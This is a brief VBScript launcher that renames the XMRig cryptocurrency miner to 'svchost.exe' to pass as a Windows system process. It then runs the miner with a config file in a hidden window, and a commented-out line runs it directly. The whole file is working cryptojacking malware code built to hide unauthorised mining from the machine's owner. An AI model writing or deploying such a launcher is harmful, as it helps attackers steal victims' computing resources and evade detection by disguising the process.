Set WshShell = CreateObject("Wscript.Shell")
WshShell.Run "ren xmrig.exe svchost.exe", 0, True
WshShell.Run "svchost.exe --config=config.json", 0, False
' CreateObject("Wscript.Shell").Run "xmrig.exe", 0, False
